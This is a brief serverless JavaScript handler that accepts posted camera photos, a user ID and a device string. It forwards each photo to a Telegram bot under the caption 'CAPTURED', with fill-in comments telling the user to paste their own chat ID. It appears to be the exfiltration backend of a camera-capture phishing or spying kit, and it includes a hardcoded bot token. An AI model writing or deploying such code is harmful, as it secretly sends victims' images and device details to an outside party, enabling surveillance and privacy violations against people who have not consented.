exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Only POST' };
  }
  
  const data = JSON.parse(event.body);
  const uid = data.uid;
  const photo = data.photo;
  
  // 👇 PASTE YOUR CHAT ID HERE
  const CHAT_ID = "8533642417";  // Your chat ID from step 1
  
  // Send photo to YOUR Telegram
  await fetch(`https://api.telegram.org/bot8518570189:AAGyKdmfhIoaBAsQy3pEFI7sN5sLbfAHxHk/sendPhoto`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: photo,
      caption: `🎥 CAPTURED: ${uid}\n📱 Device: ${data.ua.substring(0,50)}`
    })
  });
  
  console.log('📸 SENT TO TELEGRAM:', uid);
  return { statusCode: 200, body: JSON.stringify({ok:true}) };
};
